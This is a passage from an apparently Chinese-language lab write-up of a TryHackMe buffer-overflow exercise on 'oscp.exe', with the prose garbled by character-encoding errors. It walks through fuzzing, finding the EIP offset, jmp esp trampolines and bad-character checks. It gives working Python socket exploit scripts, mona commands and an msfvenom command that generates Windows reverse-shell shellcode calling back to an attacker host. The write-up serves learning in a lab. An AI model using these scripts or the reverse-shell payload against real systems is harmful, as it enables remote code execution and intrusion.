ï¼Œå®ƒä»¬éƒ½æ˜¯èƒ½å¤Ÿè·³è½¬åˆ°ä¸€ä¸ªå¯„å­˜å™¨å†…æ‰€å­˜æ”¾çš„åœ°å€å»æ‰§è¡Œï¼Œæ¯”å¦‚è¯´åƒæˆ‘ä»¬è¿™ä¸ª jmp esp æˆ–è€…è¯´ call esp æˆ–è€…è¯´ jmp ecx æˆ–è€…è¯´æ˜¯ call eax ç­‰ç­‰ï¼Œå¦‚æœè¯´åœ¨å‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œcpuå†…çš„å¯„å­˜å™¨åˆšå¥½å°±æ˜¯ç›´æ¥æˆ–è€…é—´æ¥æŒ‡å‘æˆ‘ä»¬çš„è¿™ä¸ªshellcodeçš„èµ·å§‹ä½ç½®ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠæ ˆå†…å­˜æ”¾è¿”å›åœ°å€çš„é‚£ä¸ªå†…å­˜å•å…ƒè¦†ç›–ä¸ºç›¸åº”çš„è·³æ¿åœ°å€ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œespå¯„å­˜å™¨ä¼šæœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š å½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œespå°±ä¼šè‡ªåŠ¨å˜æˆ è¿”å›åœ°å€çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œè€Œespå®ƒè¿™ä¸ªå˜åŒ–ä¸€èˆ¬æ¥è¯´æ˜¯ä¸å—ä»»ä½•æƒ…å†µçš„å€¾å‘çš„ï¼Œé‚£ä¹ˆæ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸€ä¸ªç‰¹æ€§ï¼Œå…¶å®å°±å¯ä»¥å°†è¿”å›åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢çš„0012FF84ä½ç½®å¤„çš„å€¼ï¼‰ï¼Œè¦†ç›–æˆjmp espè¯­å¥æ‰€åœ¨çš„åœ°å€ã€‚ å°†åŸå§‹è¿”å›åœ°å€ï¼Œè¦†ç›–æˆjmp espè¯­å¥æ‰€åœ¨çš„åœ°å€ä¹‹åï¼Œå½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°†ä¼šå»æ‰§è¡Œé‚£ä¸ªè·³æ¿ï¼ˆjmp espè¯­å¥ï¼‰ï¼Œè€Œæ­¤æ—¶espå¯„å­˜å™¨çš„å€¼æ­£å¥½æ˜¯ 0012FF88(å³ï¼šåŸå§‹è¿”å›åœ°å€ä½ç½®çš„ä¸‹ä¸€ä¸ªä½ç½®)ï¼Œäºæ˜¯å½“ç³»ç»Ÿæ‰§è¡Œå®Œjmp espä¹‹åï¼Œå°±ä¼šè·³è½¬åˆ°0012FF88è¿™ä¸ªä½ç½®ï¼Œåœ¨è¿™ä¸ªä½ç½®ç»§ç»­æ‰§è¡Œä»£ç ï¼Œè€Œæ°æ°è¿™ä¸ªä½ç½®æ­£æ˜¯æˆ‘ä»¬shellcodeä»£ç æ‰€åœ¨çš„ä½ç½®ã€‚ é‚£æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°è¯¥jmp espæŒ‡ä»¤çš„åœ°å€ï¼ˆä¸åŒæ“ä½œç³»ç»Ÿåœ°å€å¯èƒ½ä¸ä¸€æ ·ï¼Œä½†å¦‚ä½•æ‰¾è¿™é‡Œä¸èµ˜è¿°ï¼‰ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¼–å†™shellcodeï¼ˆç§°ä½œå·²ç»ç¼–è¯‘å¥½çš„æœºå™¨ç ï¼‰ é‚£æœ€ç»ˆæˆ‘ä»¬çš„æ•´ä¸ªpayloadå°±æ˜¯ï¼šï¼ˆå¯¹äºå‚è€ƒæ–‡ç« ä¾‹å­æ¥è®²ï¼‰ ç”¨äºè¦†ç›–å‰é¢12ä¸ªå­—èŠ‚çš„ç©ºé—´+è¦†ç›–EBPçš„+è¦†ç›–è¿”å›åœ°å€çš„+shellcode é—®é¢˜ä¸‰ è¿™æ¬¡ä»tryhackmeçš„è§’åº¦å‡ºå‘æ¥åˆ†æï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯è·ŸPWNæ€è·¯å·®è·å¾ˆå¤§ï¼ˆè‡ªè®¤ä¸ºï¼‰ã€‚ é¦–å…ˆå°±æ˜¯fuzzæ‰¾åˆ°å¤šå°‘å­—èŠ‚æ‰ä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºä½¿ç¨‹åºå´©æºƒï¼Œç¡®å®šäº†å­—èŠ‚ä¹‹åå°±æ˜¯è¦æ‰¾å¯„å­˜å™¨çš„åœ°å€ï¼Œè¿™é‡Œæ˜¯å€ŸåŠ©monaæ¥æ‰¾EIPå¯„å­˜å™¨åœ°å€ï¼š1978ï¼Œä¹Ÿå°±æ˜¯EIPçš„åç§»é‡offsetï¼Œç±»æ¯”é—®é¢˜äºŒæ€è·¯ï¼Œè¿™é‡Œçš„1978å°±æ˜¯å­å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆä¹Ÿå°±æ˜¯1978åœ°å€ä¹‹åï¼‰æ„å‘³ç€è¿™ä¸ªåœ°å€ä¹‹åçš„éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬æƒ³è¦ç²¾å¿ƒæ„é€ çš„éƒ¨åˆ† ä¹‹åå°±æ˜¯å¯»æ‰¾è·³è·ƒç‚¹ï¼Œä¹Ÿå°±æ˜¯jmp espçš„åœ°å€ã€‚æˆ‘è®¤ä¸ºå¯ä»¥é€šè¿‡è¿™ç¯‡æ–‡ç« ï¼šhttps://blog.csdn.net/yajuanpi4899/article/details/120944213 æ¥è®¤çœŸç†è§£æ ˆæº¢å‡ºçš„åŸç†ã€‚æˆ‘ä»¬æœ€ç»ˆçš„çŠ¶æ€å°±æ˜¯åœ¨è¿›è¡Œå‡ºæ ˆè¯»å†™æ“ä½œçš„æ—¶å€™å‘ç”Ÿçš„æ¼æ´ï¼Œåœ¨è¿›è¡Œæ ˆè¯»å†™æ—¶ã€‚espä¸æ–­èµ‹å€¼ç»™eipï¼ŒåŒæ—¶ä¸æ–­å‡ºæ ˆï¼Œå‘é«˜åœ°å€è½¬ç§»ï¼Œè¿™æ—¶å€™å­˜åœ¨æŸä¸ªå˜é‡varï¼ˆç¨‹åºä¸­å¯¹VARæ²¡æœ‰æ§åˆ¶å¯è¾“å…¥é‡å¤§å°ï¼‰ï¼Œå½“æˆ‘ä»¬ç»™å…¶èµ‹å€¼çš„æ•°æ®æ‰¾è¿‡å¯è¾“å…¥é‡é™åˆ¶ï¼Œåˆ™ä¼šç»§ç»­å‘é«˜åœ°å€è¦†ç›–ï¼Œæ¸æ¸çš„ä¼šè¦†ç›–çˆ¶å‡½æ•°ebpï¼Œç„¶åè¦†ç›–å­å‡½æ•°è¿”å›åœ°å€retï¼Œè€Œè¿™ä¸ªretå°†ä¼šè¢«æˆ‘ä»¬è¦†ç›–ä¸ºæˆ‘ä»¬çš„åé—¨åœ°å€ã€‚ å½“eipè¯»å–åˆ°åé—¨åœ°å€çš„æ—¶å€™ï¼Œç³»ç»Ÿå°†ä¼šè·³è½¬åˆ°è¯¥åœ°å€æ‰§è¡Œå¯¹åº”çš„åé—¨å‡½æ•°ã€‚ ä½†åœ¨æ­¤ä¹‹å‰ï¼Œå®ƒé€šè¿‡å‘ç¼“å†²åŒºæº¢å‡ºéƒ¨åˆ†å†™å…¥badcharså­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡æ¯”è¾ƒå½“å‰espåœ°å€ä¸å½“å‰äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹é—´çš„å·®å¼‚ï¼ˆè¯¥äºŒè¿›åˆ¶æ–‡ä»¶è¢«æˆ‘ä»¬å†™å…¥äº†bacharså­—ç¬¦ä¸²ï¼‰ï¼Œæ ¹æ®ä¸Šè¿°thmå®éªŒçš„debuggerï¼Œä¼šå‘æˆ‘ä»¬æ˜¾ç¤ºé”™è¯¯çš„ä¹Ÿå°±æ˜¯badcharï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾çœŸæ­£çš„badcharå¹¶å°†å…¶è¿‡æ»¤æ‰ï¼šåŸå› åœ¨äºæˆ‘ä»¬åç»­éœ€è¦é€šè¿‡msfvenomç”Ÿæˆshellcodeï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯å…¶ä¸­çš„å­—èŠ‚åºåˆ—ä¸ä¼šå¼•èµ·è¢«è®¤ä¸ºæ˜¯badcharä»¥è‡³äºshellcodeä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚ å¦‚ä¸‹é¢ï¼Œæˆ‘ä»¬ç”Ÿæˆçš„shellcodeæ˜æ˜¾æ˜¯è¿‡æ»¤æ‰äº†badchars msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b \"\\x00badchar\" -f c æœ€ç»ˆåœ¨ç”Ÿæˆpayloadferçš„æ—¶å€™ï¼Œè¿™é‡Œè¿˜æ·»åŠ äº†paddingï¼šé¢„ç½®NOP ç”±äºç¼–ç å™¨å¯èƒ½ç”¨äºç”Ÿæˆæœ‰æ•ˆè´Ÿè½½ï¼Œå› æ­¤æ‚¨å°†éœ€è¦å†…å­˜ä¸­çš„ä¸€äº›ç©ºé—´æ¥è§£å‹ç¼©æœ‰æ•ˆè´Ÿè½½æœ¬èº«ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥å°†å¡«å……å˜é‡è®¾ç½®ä¸º 16 ä¸ªæˆ– æ›´å¤š â€œæ— æ“ä½œâ€ï¼ˆ\\x90ï¼‰ å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼š //å¦ä¸€ç§è§£é‡Š è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹æ˜¯NOPSï¼Œç”±äºè¿™ä¸ªmsfvenomå¯èƒ½æ˜¯ä½¿ç”¨ç¼–ç å™¨æ¥ç”Ÿæˆpayload,æ‰€ä»¥æˆ‘ä»¬å¾—åœ¨å†…å­˜ä¸­æµå‡ºä¸€äº›ç©ºé—´æ¥è®©payloadè‡ªå·±è§£å‹ç¼©ã€‚åœ¨paddingè¿™é‡Œç•™16ä¸ªx90å‡ºæ¥æœ€åçš„è„šæœ¬æ˜¯è¿™æ ·çš„ æ€»çš„æ¥è¯´ï¼Œæœ€ç»ˆç»“æœçš„æ ¼å¼å°±æ˜¯ï¼špayloadfer = prefix + overflow + retn + padding + payload + postfix \"OVERFLOW1 \"+\"A\"*1978+\"fa110526\"+\"\"\\x90\"*16+shellcode+\"\" æœ€ç»ˆæ€è·¯å¦‚ä¸‹ æ¨¡ç³Šæµ‹è¯•ï¼šå‘ç›®æ ‡åº”ç”¨ç¨‹åºå‘é€ä¸€äº›å­—ç¬¦ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥ç ´åå…¶æ‰§è¡Œæµç¨‹ã€‚ æŸ¥æ‰¾åç§»é‡ï¼šåœ¨è¿™ä¸€æ­¥ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åˆ°è¾¾ EIP å¹¶è¦†ç›–å®ƒéœ€è¦å¤šå°‘å­—èŠ‚ã€‚ æ§åˆ¶å’Œè¦†ç›–EIPï¼šå½“æˆ‘ä»¬æ‰¾åˆ°æ­£ç¡®çš„åç§»é‡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æˆ‘ä»¬çš„ç›®çš„è¦†ç›–EIPã€‚ æŸ¥æ‰¾ä¸è‰¯å­—ç¬¦ï¼šä¸è‰¯å­—ç¬¦åªæ˜¯ä¸€ä¸ªä¸éœ€è¦çš„å­—ç¬¦/ä¸éœ€è¦çš„å­—ç¬¦åˆ—è¡¨ï¼Œå¯ä»¥ç ´åæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚æˆ‘ä»¬éœ€è¦å‘ç°è¿™äº›åå­—ç¬¦å¹¶ä»æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ä¸­å¿½ç•¥å®ƒä»¬ã€‚ å¯»æ‰¾è·³è½¬ç‚¹ï¼šè¿™æ˜¯æˆ‘ä»¬å‘Šè¯‰ç¨‹åºåº”è¯¥ä»å“ªé‡Œç»§ç»­æ‰§è¡Œçš„æ­¥éª¤ã€‚ ç”Ÿæˆ Shellcodeï¼šåŸºæœ¬ä¸Šåˆ›å»ºæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ä»¥ä»ç›®æ ‡è·å–åå‘ shellã€‚ æˆ‘è®¤ä¸ºæœ€å®¹æ˜“å‚è€ƒçš„æ–‡ç« æ˜¯ï¼š[EN] payloadfer Overflow Prep â€” OVERFLOW2 Walkthrough 0x03 oscp.exe - æº¢å‡º2 ä»è¿™é‡Œå¼€å§‹ï¼Œä¹‹åçš„æ€è·¯éƒ½ä¸ç¬¬ä¸€ä¸ªç›¸åŒã€‚å¼€å§‹ç»ƒä¹  è€è§„çŸ©ï¼Œxfreeè¿æ¥é¶æœºï¼Œæ‰“å¼€debugä¹‹åå†æ‰“å¼€æ–‡ä»¶oscp.exeï¼Œä¹‹ådebugå¼€å§‹è¿è¡ŒexeäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéšåattacker ncè¿æ¥å¯¹åº”è¿›ç¨‹æµ‹è¯•ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é…ç½®å·¥ä½œæ–‡ä»¶å¤¹ï¼Œæ‚¨å¯ä»¥åœ¨ Immunity Debugger çª—å£åº•éƒ¨çš„å‘½ä»¤è¾“å…¥æ¡†ä¸­è¿è¡Œè¯¥å‘½ä»¤ï¼š !mona config -set workingfolder c:\\mona\\%p Fuzzing åˆ›å»ºä¸€ä¸ªç”¨äºfuzzçš„è„šæœ¬ï¼Œç›®çš„åœ¨äºéªŒè¯ç›®æ ‡æœåŠ¡æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ #!/usr/bin/env python3 import socket, time, sys ip = \"10.10.108.11\" port = 1337 timeout = 5 prefix = \"OVERFLOW2 \" string = prefix + \"A\" * 100 while True: try: #AF_INETå¸¸é‡ç”¨äºæŒ‡å®šIPv4åœ°å€æ—ï¼ŒSOCK_STREAMå¸¸é‡ç”¨äºæŒ‡å®šæµå¼å¥—æ¥å­— with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) # å‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„ s.connect((ip, port)) s.recv(1024) print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix))) s.send(bytes(string, \"latin-1\")) s.recv(1024) except: print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix))) sys.exit(0) string += 100 * \"A\" time.sleep(1) è¿™é‡Œåœ¨ç†è§£ä¸€ä¸‹åŸç†ï¼ˆä¸¤ä¸ªæ˜ŸæœŸæ²¡çœ‹äº†ï¼‰ è¯¥è„šæœ¬ä¼šå‘é€è¶Šæ¥è¶Šé•¿çš„ç”±Aç»„æˆçš„å­—ç¬¦ä¸²ã€‚å¦‚æœæ¨¡ç³Šå™¨ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²è‡´ä½¿æœåŠ¡å™¨å´©æºƒï¼Œåˆ™æ¨¡ç³Šå™¨å°±ä¼šé€€å‡ºå¹¶æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚ ä¸‹å›¾è¿™é‡Œæ˜¾ç¤ºçš„æœ€å¤§å­—èŠ‚æ•°å°±æ˜¯700 bytes å¯¹åº”debugçš„å›æ˜¾ï¼Œå°±æ˜¯ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°ebpå’Œeipéƒ½æ˜¯41414141ï¼ˆ41ä»£è¡¨Aï¼‰ï¼Œä¹Ÿå°±æ˜¯EIPå·²ç»è¢«å­—ç¬¦Aè¦†ç›–æ‰äº† Crash Replication &amp; Controlling EIP ç¡®å®šæº¢å‡ºå¤§å°ä¹‹åï¼Œæˆ‘ä»¬åˆ›å»ºexploit.pyæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ import socket ip = \"10.10.108.11\" port = 1337 prefix = \"OVERFLOW2 \" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload = \"\" postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer...\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") ç„¶åè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæ¥ç”Ÿæˆé•¿åº¦å¯ä»¥å¯¼è‡´æœåŠ¡å™¨å´©æºƒçš„å­—ç¬¦ä¸²400ä¸ªå­—èŠ‚çš„å¾ªç¯æ¨¡å¼ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B å°†ä¸Šé¢å¾—åˆ°æ•°æ®ï¼Œèµ‹å€¼ç»™ä¸Šé¢è„šæœ¬çš„payloadï¼Œä¹‹åé‡æ–°è¿è¡Œoscp.exeï¼Œç„¶åè¿è¡Œexploitè„šæœ¬ å‘é€ä¹‹åå¦‚æœæ˜¯ä¸‹å›¾æ‰€ç¤ºï¼Œè¯´æ˜å‘é€æˆåŠŸ ç„¶åæˆ‘ä»¬åœ¨debuggerï¼Œåœ¨ä¸‹é¢çš„å‘½ä»¤è¾“å…¥æ¡†ä¸­ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ !mona findmsp -distance 1000 é—®äº†ä¸€ä¸‹gptï¼Œè¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯ï¼š è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨å½“å‰è°ƒè¯•ç¯å¢ƒä¸­ï¼Œåˆ©ç”¨Mona.pyè„šæœ¬æŸ¥æ‰¾ä»æŸä¸ªèµ·å§‹ä½ç½®å‘å‰æˆ–å‘å1000å­—èŠ‚èŒƒå›´å†…çš„å¯æ§æŒ‡é’ˆã€‚è¿™åœ¨æ¼æ´åˆ©ç”¨å’Œç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„å‡†å¤‡è¿‡ç¨‹ä¸­éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥å¸®åŠ©ç ”ç©¶äººå‘˜ç¡®å®šå¯åˆ©ç”¨çš„å†…å­˜ä½ç½®ã€‚ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œçš„registersæ˜¾ç¤ºçš„å°±æ˜¯å¯æ§åœ°å€ æ›´æ–°exploit.pyï¼Œè®°ä½æˆ‘ä»¬æƒ³è¦çš„æ˜¯è¦†ç›–EIPåœ°å€ï¼Œä»¥è¾¾åˆ°è®©ç¨‹åºæ‰§è¡Œåˆ°æˆ‘ä»¬å¯æ§çš„shellcodeåœ°å€å¤„ï¼Œå› æ­¤å¯¹ç…§ä¸Šå›¾ï¼Œæˆ‘ä»¬éœ€è¦å°†exploitè„šæœ¬çš„offsetå˜é‡è®¾ç½®ä¸º634ï¼Œå¹¶æ³¨æ„å°†è¿™æ¬¡çš„è„šæœ¬çš„payloadè®¾ç½®ä¸ºç©º import socket ip = \"10.10.46.165\" port = 1337 prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"BBBB\" padding = \"\" payload = \"\" postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer...\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") ç»§ç»­é‡æ–°å¯åŠ¨äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åè¿è¡Œè„šæœ¬ï¼Œçœ‹ç»“æœ ä¸‹é¢ä¸¤å›¾å±•ç¤ºäº†è„šæœ¬æ”»å‡»æˆåŠŸï¼Œ EIPè¢«èµ‹å€¼ä¸ºBBBB Finding Bad Characters ç¡®å®šäº†offsetåç§»é‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾åå­—ç¬¦ã€‚ ç„¶åä½¿ç”¨monaç”Ÿæˆå­—èŠ‚æ•°ç»„ï¼Œå¹¶é»˜è®¤æ’é™¤ç©ºå­èŠ‚ï¼ˆ\\x00ï¼‰ï¼Œè¯·æ³¨æ„ç”Ÿæˆçš„ bytearray.bin æ–‡ä»¶çš„ä½ç½®ï¼ˆå¦‚æœæ ¹æ®æœ¬æŒ‡å—çš„ Mona é…ç½®éƒ¨åˆ†è®¾ç½®å·¥ä½œæ–‡ä»¶å¤¹ï¼Œåˆ™è¯¥ä½ç½®åº”C:\\mona\\oscp\\bytearray.binï¼‰ã€‚ !mona bytearray -b \"\\x00\" ç°åœ¨ç”Ÿæˆä¸€ä¸ªä¸å­—èŠ‚æ•°ç»„ç›¸åŒçš„åå­—ç¬¦å­—ç¬¦ä¸²ã€‚ä»¥ä¸‹ python è„šæœ¬å¯ç”¨äºç”Ÿæˆä» \\x01 åˆ° \\xff çš„åå­—ç¬¦å­—ç¬¦ä¸²ï¼š for x in range(1, 256): print(\"\\\\x\" + \"{:02x}\".format(x), end='') print() `\"{:02x}\".format(x)`æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è¯­æ³•ï¼Œç”¨äºå°†æ•´æ•°`x`æ ¼å¼åŒ–ä¸ºä¸¤ä½çš„åå…­è¿›åˆ¶æ•°ï¼Œå¹¶åœ¨ä¸è¶³ä¸¤ä½æ—¶ä½¿ç”¨å‰å¯¼é›¶è¿›è¡Œå¡«å……ã€‚è®©æˆ‘ä»¬é€ä¸ªè§£é‡Šå…¶ä¸­çš„æ¯ä¸ªéƒ¨åˆ†ï¼š - `{}` æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å ä½ç¬¦ï¼Œå®ƒè¡¨ç¤ºå°†è¦æ’å…¥ä¸€ä¸ªå€¼ã€‚ - `:02` æ˜¯æ ¼å¼è§„èŒƒï¼ŒæŒ‡å®šäº†å¯¹åº”çš„å€¼çš„æ ¼å¼ã€‚ - `:` è¡¨ç¤ºæ ¼å¼è§„èŒƒçš„å¼€å§‹ã€‚ - `02` è¡¨ç¤ºå°†å€¼æ ¼å¼åŒ–ä¸ºä¸¤ä½å®½åº¦ã€‚å¦‚æœå€¼ä¸è¶³ä¸¤ä½ï¼Œåˆ™ä½¿ç”¨å‰å¯¼é›¶è¿›è¡Œå¡«å……ã€‚ - `x` æ˜¯æ ¼å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè¡¨ç¤ºå°†å€¼æ ¼å¼åŒ–ä¸ºåå…­è¿›åˆ¶æ•°ã€‚ å› æ­¤ï¼Œ`\"{:02x}\".format(x)`ä¸­çš„`x`è¡¨ç¤ºå°†æ•´æ•°`x`è½¬æ¢ä¸ºä¸¤ä½çš„åå…­è¿›åˆ¶æ•°ï¼Œå¦‚æœä¸è¶³ä¸¤ä½åˆ™ç”¨å‰å¯¼é›¶å¡«å……ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š - å½“`x`çš„å€¼ä¸º10æ—¶ï¼Œ`\"{:02x}\".format(x)`å°†ç”Ÿæˆå­—ç¬¦ä¸²`\"0a\"`ã€‚ - å½“`x`çš„å€¼ä¸º255æ—¶ï¼Œ`\"{:02x}\".format(x)`å°†ç”Ÿæˆå­—ç¬¦ä¸²`\"ff\"`ã€‚ åœ¨ç»™å®šç¤ºä¾‹ä»£ç ä¸­ï¼Œå¾ªç¯è¿­ä»£çš„æ¯ä¸ªæ•´æ•°`x`éƒ½ä¼šé€šè¿‡`\"{:02x}\".format(x)`è¿›è¡Œæ ¼å¼åŒ–ï¼Œç”Ÿæˆå¯¹åº”çš„ä¸¤ä½åå…­è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚è¿™äº›å­—ç¬¦ä¸²å°†è¢«æ‹¼æ¥å¹¶æ‰“å°å‡ºæ¥ï¼Œå½¢æˆä»1åˆ°255çš„æ‰€æœ‰å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬ä¹‰åºåˆ—ã€‚ \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff ç„¶åå°†ä¸Šè¿°å¾—åˆ°çš„ç»“æœï¼Œèµ‹å€¼ç»™è„šæœ¬çš„payload è¿è¡Œä¹‹åå¾—åˆ°ESPçš„åœ°å€ï¼Œç„¶åç”¨monaå‘½ä»¤æŸ¥çœ‹åå­—ç¬¦ !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 01ABFA30 